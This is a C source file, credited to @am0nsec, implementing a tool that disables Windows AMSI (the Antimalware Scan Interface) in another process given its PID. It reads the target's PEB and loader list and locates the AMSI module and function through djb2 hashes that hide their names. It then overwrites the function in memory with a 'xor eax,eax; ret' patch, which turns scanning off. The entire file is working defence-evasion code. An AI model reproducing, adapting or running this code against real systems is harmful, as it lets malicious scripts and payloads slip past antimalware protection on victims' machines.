/*+===================================================================
  File:      amsi_module_patch.c
  Summary:   Disable AMSI in a remote process.
  Classes:   N/A
  Functions: N/A
  Origin:    https://github.com/am0nsec
##
  Author: Paul Laine (@am0nsec)
===================================================================+*/
#include <Windows.h>
#include <stdio.h>
#include "structs.h"

#pragma comment(lib, "ntdll")
NTSTATUS NTAPI NtQueryInformationProcess(
	__in  HANDLE ProcessHandle,
	__in  DWORD  ProcessInformationClass,
	__out PVOID  ProcessInformation,
	__in  ULONG  ProcessInformationLength,
	__out PULONG ReturnLength
);

/*--------------------------------------------------------------------
  Macros.
--------------------------------------------------------------------*/
#define NT_SUCCESS(Status)   ((NTSTATUS)(Status) >= 0)
#define MODULE_FUNCTION_HASH 0xef9560b87e51d9fd
#define MODULE_NAME_HASH     0x7a41ff5c4c483108

/*--------------------------------------------------------------------
  Function prototypes.
--------------------------------------------------------------------*/
PTEB RtlGetThreadEnvironmentBlock();
PPEB RtlGetProcessEnvironmentBlock();
BOOL GetRemoteProcessPeb(
	__in  PHANDLE                    pHandle,
	__out PPEB                       pRemotePeb,
	__out PPROCESS_BASIC_INFORMATION pBasicInformation
);
BOOL GetLoaderDataStructure(
	__in  PHANDLE       pHandle,
	__out PPEB_LDR_DATA pLdrData,
	__out LPBYTE        pPebBaseAddress
);
DWORD64 djb2(__in PBYTE str);
PVOID GetModuleBaseAddress(
	__in PHANDLE pHandle,
	__in PPEB_LDR_DATA pLdrData
);
BOOL GetModuleExportDirectory(
	__in  PHANDLE                 pHandle,
	__out PIMAGE_EXPORT_DIRECTORY pImageExportDirectory,
	__in  PVOID                   pModuleBaseAddress
);
PVOID GetModuleFunctionAddress(
	__in  PHANDLE                 pHandle,
	__in  PIMAGE_EXPORT_DIRECTORY pExportDirectory,
	__in  PVOID                   pModuleBaseAddress
);
BOOL PatchModuleFunction(
	__in PHANDLE pHandle,
	__in PVOID   pModuleFunctionAddress
);

/*--------------------------------------------------------------------
  Global variables.
--------------------------------------------------------------------*/
PTEB  g_pCurrentTeb = NULL;
PPEB  g_pCurrentPeb = NULL;

INT wmain(INT argc, wchar_t* argv[]) {
	wprintf(L"[>] AMSI Module Patch.\n");
	wprintf(L"[>] Author: Paul Laine (@am0nsec).\n");
	wprintf(L"   ---------------------------------\n\n");

	/*--------------------------------------------------------------------
	  Get process environment block and thread environment block.
	--------------------------------------------------------------------*/
	g_pCurrentTeb = RtlGetThreadEnvironmentBlock();
	g_pCurrentPeb = RtlGetProcessEnvironmentBlock();
	if (!g_pCurrentPeb || !g_pCurrentTeb  || g_pCurrentPeb->OSMajorVersion != 0xA) {
		wprintf(L"[-] This program is only supported by Windows 10 and greater.\n\n");
		return 0x1;
	}

	/*--------------------------------------------------------------------
	  Get the PID of the targeted process.
	--------------------------------------------------------------------*/
	if (argc != 2) {
		wprintf(L"[-] Invalid number of parameters.\n");
		wprintf(L"    Usage: %ws <process ID>\n\n", argv[0]);
		return 0x1;
	}
	DWORD dwRemoteProcessId = _wtoi(argv[1]);
	wprintf(L"[>] Target process ID: %d\n", dwRemoteProcessId);

	/*--------------------------------------------------------------------
	  Get the HANDLE of the targeted process.
	--------------------------------------------------------------------*/
	wprintf(L"[>] Searching module base address ...\n");
	HANDLE hRemoteProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE, FALSE, dwRemoteProcessId);
	if (hRemoteProcess == INVALID_HANDLE_VALUE) {
		wprintf(L"[-] Error while getting a HANDLE to the remote process: %d\n\n", g_pCurrentTeb->LastErrorValue);
		return 0x01;
	}
	wprintf(L"   - Process handle: 0x%016llx\n", (DWORD64)hRemoteProcess);
	
	/*--------------------------------------------------------------------
	  Get the PEB of the remote process.
	--------------------------------------------------------------------*/
	PROCESS_BASIC_INFORMATION BasicInformation = { 0 };
	PEB RemotePeb = { 0 };
	if (!GetRemoteProcessPeb(&hRemoteProcess, &RemotePeb, &BasicInformation)) {
		CloseHandle(hRemoteProcess);
		return 0x01;
	}

	/*--------------------------------------------------------------------
	  Get the address of the PEB_LDR_DATA structure.
	--------------------------------------------------------------------*/
	PEB_LDR_DATA LdrData = { 0 };
	if (!GetLoaderDataStructure(&hRemoteProcess, &LdrData, (LPBYTE)BasicInformation.PebBaseAddress)) {
		CloseHandle(hRemoteProcess);
		return 0x01;
	}

	/*--------------------------------------------------------------------
	  Search for the base address of the AMSI module.
	--------------------------------------------------------------------*/
	PVOID pModuleBaseAddress = GetModuleBaseAddress(&hRemoteProcess, &LdrData);
	if (pModuleBaseAddress == NULL) {
		wprintf(L"[-] Invalid module base address: %d\n\n", g_pCurrentTeb->LastErrorValue);
		return 0x01;
	}
	wprintf(L"   - Module base address: 0x%016llx\n", (DWORD64)pModuleBaseAddress);
	wprintf(L"[+] Searching module base address ... OK\n\n");

	/*--------------------------------------------------------------------
	  Get export directory structure of the module
	--------------------------------------------------------------------*/
	wprintf(L"[>] Searching function address ...\n");
	IMAGE_EXPORT_DIRECTORY ExportDirectory = { 0 };
	if (!GetModuleExportDirectory(&hRemoteProcess, &ExportDirectory, pModuleBaseAddress)) {
		CloseHandle(hRemoteProcess);
		return 0x01;
	}

	/*--------------------------------------------------------------------
	  Parse the export table of the module.
	  Re-implementation of the GetProcAddress function.
	--------------------------------------------------------------------*/
	PVOID pModuleFunctionAddress = GetModuleFunctionAddress(&hRemoteProcess, &ExportDirectory, pModuleBaseAddress);
	if (pModuleFunctionAddress == NULL) {
		CloseHandle(hRemoteProcess);
		return 0x01;
	}
	wprintf(L"   - Function address: 0x%016llx\n", (DWORD64)pModuleFunctionAddress);
	wprintf(L"[+] Searching function address ... OK\n\n");


	/*--------------------------------------------------------------------
	  Parse the export table of the module.
	  Re-implementation of the GetProcAddress function.
	--------------------------------------------------------------------*/
	if (!PatchModuleFunction(&hRemoteProcess, pModuleFunctionAddress)) {
		CloseHandle(hRemoteProcess);
		return 0x01;
	}

	/*--------------------------------------------------------------------
	  Cleanup and exit.
	--------------------------------------------------------------------*/
	if (hRemoteProcess != INVALID_HANDLE_VALUE)
		CloseHandle(hRemoteProcess);
	return 0x0;
}

/*F+F+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
  Function: RtlGetThreadEnvironmentBlock
  Summary:  Get the TEB from the GS/FS register.
  Args:     N/A
  Returns:  PTEB
-----------------------------------------------------------------F-F*/
PTEB RtlGetThreadEnvironmentBlock() {
#if _WIN64
	return (PTEB)__readgsqword(0x30);
#else
	return (PTEB)__readfsdword(0x16);
#endif
}

/*F+F+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
  Function: RtlGetProcessEnvironmentBlock
  Summary:  Get the PEB from the GS/FS register.
  Args:     N/A
  Returns:  PPEB
-----------------------------------------------------------------F-F*/
PPEB RtlGetProcessEnvironmentBlock() {
#if _WIN64
	return (PPEB)__readgsqword(0x60);
#else
	return (PPEB)__readfsdword(0x30);
#endif
}

/*F+F+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
  Function: GetRemoteProcessPeb
  Summary:  Get PEB from a remote process.

  Args:     PHANDLE pHandle
               - Pointer to an handle of a remote process.
	    PPEB pRemotePeb
	       - Pointer to the PEB structure of the remote process.
	    PPROCESS_BASIC_INFORMATION pBasicInformation
	       - Pointer to a structure that contains information about
	         the remote process.

  Returns:  BOOL
-----------------------------------------------------------------F-F*/
BOOL GetRemoteProcessPeb(PHANDLE pHandle, PPEB pRemotePeb, PPROCESS_BASIC_INFORMATION pBasicInformation) {
	ULONG lBytesWritten = 0;
	NtQueryInformationProcess(*pHandle, 0, pBasicInformation, sizeof(PROCESS_BASIC_INFORMATION), &lBytesWritten);
	if (lBytesWritten != sizeof(PROCESS_BASIC_INFORMATION)) {
		wprintf(L"[-] Something went wrong will gathering remote process basic information: %d\n\n", g_pCurrentTeb->LastErrorValue);
		return FALSE;
	}

	SIZE_T lBytesRead = 0;
	ReadProcessMemory(*pHandle, pBasicInformation->PebBaseAddress, pRemotePeb, sizeof(PEB), &lBytesRead);
	if (lBytesRead != sizeof(PEB)) {
		wprintf(L"[-] Something went wrong will getting remote PEB: %d\n\n", g_pCurrentTeb->LastErrorValue);
		return FALSE;
	}

	wprintf(L"   - Process image base: 0x%016llx\n", (DWORD64)pRemotePeb->ImageBase);
	return TRUE;
}

/*F+F+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
  Function: GetLoaderDataStructure
  Summary:  Get the loader data structure from a the remote process.

  Args:     PHANDLE pHandle
               - Pointer to an handle of a remote process.
	    PPEB_LDR_DATA pLdrData
	       - Pointer to the loader data structure from the remote
		 process.
	    LPBYTE pPebBaseAddress
	       - Base address of the PEB structure from the remote
		 process.

  Returns:  BOOL
-----------------------------------------------------------------F-F*/
BOOL GetLoaderDataStructure(PHANDLE pHandle, PPEB_LDR_DATA pLdrData, LPBYTE pPebBaseAddress) {
	LPVOID pLdrDataAddress = NULL;
	SIZE_T lBytesRead = 0;
#if _WIN64
	ReadProcessMemory(*pHandle, (pPebBaseAddress + 0x18), &pLdrDataAddress, sizeof(PPEB_LDR_DATA), &lBytesRead);
#else
	ReadProcessMemory(*pHandle, (pPebBaseAddress + 0x0c), &pLdrDataAddress, sizeof(PPEB_LDR_DATA), &lBytesWritten);
#endif
	if (!pLdrDataAddress || lBytesRead != sizeof(PPEB_LDR_DATA)) {
		wprintf(L"[-] Invalid loader data address returned: %d\n\n", g_pCurrentTeb->LastErrorValue);
		return FALSE;
	}
	wprintf(L"   - Loader data address: 0x%016llx\n", (DWORD64)pLdrDataAddress);

	ReadProcessMemory(*pHandle, pLdrDataAddress, pLdrData, sizeof(PEB_LDR_DATA), &lBytesRead);
	if (lBytesRead != sizeof(PEB_LDR_DATA)) {
		wprintf(L"[-] Invalid loader data structure returned: %d\n\n", g_pCurrentTeb->LastErrorValue);
		return FALSE;
	}

	return TRUE;
}

/*F+F+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
  Function: djb2
  Summary:  Get the hash of a ASCII string.
  
  Args:     PBYTE str
               - Pointer to an ASCII string to hash.

  Returns:  DWORD64
-----------------------------------------------------------------F-F*/
DWORD64 djb2(PBYTE str) {
	DWORD64 dwHash = 0x77347734;
	INT c;

	while (c = *str++)
		dwHash = ((dwHash << 0x5) + dwHash) + c;

	return dwHash;
}

/*F+F+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
  Function: GetModuleFunctionAddress
  Summary:  Parse all the LDR_DATA_TABLE_ENTRY structures of the 
            PEB_LDR_DATA structure of a remote process in order to find
	    the base address of module.

  Args:     PHANDLE pHandle
               - Pointer to an handle of a remote process.
            PPEB_LDR_DATA pLdrData
	       - Pointer to the loader data structure from the remote
	         process.

  Returns:  PVOID
-----------------------------------------------------------------F-F*/
PVOID GetModuleBaseAddress(PHANDLE pHandle, PPEB_LDR_DATA pLdrData) {
	SIZE_T lBytesRead = 0;
	PLIST_ENTRY pListEntry = (PLIST_ENTRY)((PBYTE)pLdrData->InMemoryOrderModuleList.Flink - 0x10);
	PLIST_ENTRY pListEntryFirstElement = pListEntry;
	PVOID pAddress = NULL;
	do {
		LDR_DATA_TABLE_ENTRY LdrDataEntry;
		ReadProcessMemory(*pHandle, pListEntry, &LdrDataEntry, sizeof(LDR_DATA_TABLE_ENTRY), &lBytesRead);
		if (lBytesRead != sizeof(LDR_DATA_TABLE_ENTRY)) {
			wprintf(L"[-] Invalid loader data entry returned: %d\n\n", g_pCurrentTeb->LastErrorValue);
			return NULL;
		}

		// Get the name of the entry
		if (LdrDataEntry.DllBase) {
			PWCHAR pLdrDataEntryName = HeapAlloc(g_pCurrentPeb->ProcessHeap, HEAP_ZERO_MEMORY, LdrDataEntry.BaseDllName.MaximumLength);
			ReadProcessMemory(*pHandle, LdrDataEntry.BaseDllName.Buffer, pLdrDataEntryName, LdrDataEntry.BaseDllName.MaximumLength, NULL);

			// Convert from Unicode to ASCII
			INT size = WideCharToMultiByte(CP_ACP, 0, pLdrDataEntryName, LdrDataEntry.BaseDllName.MaximumLength, NULL, 0, NULL, NULL);
			PBYTE pLdrDataEntryNameAscii = HeapAlloc(g_pCurrentPeb->ProcessHeap, 0, size + 1);
			size = WideCharToMultiByte(CP_ACP, 0, pLdrDataEntryName, LdrDataEntry.BaseDllName.MaximumLength, pLdrDataEntryNameAscii, size, NULL, NULL);

			// Check the name of the module
			if (MODULE_NAME_HASH == djb2(pLdrDataEntryNameAscii)) {
				pAddress = LdrDataEntry.DllBase;
			}

			HeapFree(g_pCurrentPeb->ProcessHeap, 0, pLdrDataEntryName);
			HeapFree(g_pCurrentPeb->ProcessHeap, 0, pLdrDataEntryNameAscii);
			pLdrDataEntryName = NULL;
			pLdrDataEntryNameAscii = NULL;
		}

		if (pAddress != NULL)
			return pAddress;

		pListEntry = (PLIST_ENTRY)((PBYTE)LdrDataEntry.InMemoryOrderLinks.Flink - 0x10);
	} while (pListEntry != pListEntryFirstElement);

	return NULL;
}

/*F+F+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
  Function: GetModuleExportDirectory
  Summary:  Parse the PE header of the module in order to get the 
            export directory structure of the module.

  Args:     PHANDLE pHandle
               - Pointer to an handle of a remote process.
            PIMAGE_EXPORT_DIRECTORY pImageExportDirectory
               - Pointer to the export directory structure of a remote
                 process.
            VOID pModuleBaseAddress
               - Pointer to the address of the module to patch.

  Returns:  BOOL
-----------------------------------------------------------------F-F*/
BOOL GetModuleExportDirectory(PHANDLE pHandle, PIMAGE_EXPORT_DIRECTORY pImageExportDirectory, PVOID pModuleBaseAddress) {
	IMAGE_NT_HEADERS ModuleImageNtHeaders = { 0 };
	IMAGE_DOS_HEADER ModuleImageDosHeader = { 0 };
	SIZE_T lBytesRead = 0;

	ReadProcessMemory(*pHandle, (LPCVOID)pModuleBaseAddress, &ModuleImageDosHeader, sizeof(IMAGE_DOS_HEADER), &lBytesRead);
	if (ModuleImageDosHeader.e_magic != IMAGE_DOS_SIGNATURE || lBytesRead != sizeof(IMAGE_DOS_HEADER)) {
		wprintf(L"[-] Invalid module DOS header: %d\n\n", g_pCurrentTeb->LastErrorValue);
		return FALSE;
	}
	wprintf(L"   - DOS Header: 0x%016llx\n", (DWORD64)pModuleBaseAddress);

	LPCVOID lpImageDosHeadersAddress = ((PBYTE)pModuleBaseAddress + ModuleImageDosHeader.e_lfanew);
	ReadProcessMemory(*pHandle, lpImageDosHeadersAddress, &ModuleImageNtHeaders, sizeof(IMAGE_NT_HEADERS), &lBytesRead);
	if (ModuleImageNtHeaders.Signature != IMAGE_NT_SIGNATURE || lBytesRead != sizeof(IMAGE_NT_HEADERS)) {
		wprintf(L"[-] Invalid module NT header: %d\n\n", g_pCurrentTeb->LastErrorValue);
		return FALSE;
	}
	wprintf(L"   - NT Headers: 0x%016llx\n", (DWORD64)lpImageDosHeadersAddress);

	PIMAGE_DATA_DIRECTORY DataDirectory = ModuleImageNtHeaders.OptionalHeader.DataDirectory;
	ReadProcessMemory(*pHandle, ((PBYTE)pModuleBaseAddress + DataDirectory[0].VirtualAddress), pImageExportDirectory, DataDirectory[0].Size, &lBytesRead);
	if (lBytesRead != DataDirectory[0].Size) {
		wprintf(L"[-] Invalid export directory returned: %d\n\n", g_pCurrentTeb->LastErrorValue);
		return FALSE;
	}

	wprintf(L"   - Export directory: 0x%016llx\n", (DWORD64)((PBYTE)pModuleBaseAddress + DataDirectory[0].VirtualAddress));
	return TRUE;
}

/*F+F+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
  Function: GetModuleFunctionAddress
  Summary:  Parse the arrays in the export directory to find the
            address of the function to patch.

  Args:     PHANDLE pHandle
               - Pointer to an handle of a remote process.
	    PIMAGE_EXPORT_DIRECTORY pImageExportDirectory
	       - Pointer to the export directory structure of a remote
		 process.
	    PVOID pModuleBaseAddress
	       - Pointer to the address of the module to patch.

  Returns:  PVOID
-----------------------------------------------------------------F-F*/
PVOID GetModuleFunctionAddress(PHANDLE pHandle, PIMAGE_EXPORT_DIRECTORY pExportDirectory, PVOID pModuleBaseAddress) {
	PDWORD aAddressOfFunctions = (PDWORD)((PBYTE)pModuleBaseAddress + pExportDirectory->AddressOfFunctions);
	PDWORD aAddressOfNames = (PDWORD)((PBYTE)pModuleBaseAddress + pExportDirectory->AddressOfNames);
	PWORD aAddressOfNameOrdinales = (PWORD)((PBYTE)pModuleBaseAddress + pExportDirectory->AddressOfNameOrdinals);

	SIZE_T lBytesRead = 0;
	PVOID pFunctionAddress = NULL;
	for (WORD cx = 0; cx < pExportDirectory->NumberOfNames; cx++) {
		DWORD dwAddressOfNamesValue = 0;
		ReadProcessMemory(*pHandle, aAddressOfNames + cx, &dwAddressOfNamesValue, sizeof(DWORD), NULL);

		PBYTE pFunctionName = HeapAlloc(g_pCurrentPeb->ProcessHeap, HEAP_ZERO_MEMORY, MAX_PATH);
		ReadProcessMemory(*pHandle, (PBYTE)pModuleBaseAddress + dwAddressOfNamesValue, pFunctionName, MAX_PATH, NULL);

		if (MODULE_FUNCTION_HASH == djb2(pFunctionName)) {
			WORD wFunctionOrdinal = 0;
			ReadProcessMemory(*pHandle, aAddressOfNameOrdinales + cx, &wFunctionOrdinal, sizeof(WORD), &lBytesRead);
			if (lBytesRead != sizeof(WORD)) {
				wprintf(L"[-] Error while getting the ordinal of the function");
				return NULL;
			}

			DWORD dwFunctionAddressOffset = 0;
			ReadProcessMemory(*pHandle, aAddressOfFunctions + wFunctionOrdinal, &dwFunctionAddressOffset, sizeof(DWORD), &lBytesRead);
			if (lBytesRead != sizeof(DWORD)) {
				wprintf(L"[-] Error while getting the address of the function");
				return NULL;
			}

			pFunctionAddress = (DWORD64)pModuleBaseAddress + dwFunctionAddressOffset;
		}

		HeapFree(g_pCurrentPeb->ProcessHeap, HEAP_ZERO_MEMORY, pFunctionName);
		pFunctionName = NULL;

		if (pFunctionAddress != NULL)
			return pFunctionAddress;
	}

	return NULL;
}

/*F+F+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
  Function: PatchModuleFunction
  Summary:  Patch the AMSI module function of a remote process.

  Args:     PHANDLE pHandle
               - Pointer to an handle of a remote process.
	    PVOID pModuleFunctionAddress
	       - Address of the module function to patch, in the remote
		 process.

  Returns:  BOOL
-----------------------------------------------------------------F-F*/
BOOL PatchModuleFunction(PHANDLE pHandle, PVOID lpModuleFunctionAddress) {
	BYTE patch[] = { 0x31, 0xC0, 0xC3 };
	SIZE_T lBytesWritten = 0;

	wprintf(L"[>] Patching the module ...\n");
	WriteProcessMemory(*pHandle, lpModuleFunctionAddress, (LPCVOID)&patch, (sizeof(BYTE) * 3), &lBytesWritten);
	if (lBytesWritten != (sizeof(BYTE) * 3)) {
		wprintf(L"[>] Error while patching the DLL in memory: %d\n", g_pCurrentTeb->LastErrorValue);
		return FALSE;
	}

	wprintf(L"[+] Patching the module ... OK\n\n");
	return TRUE;
}
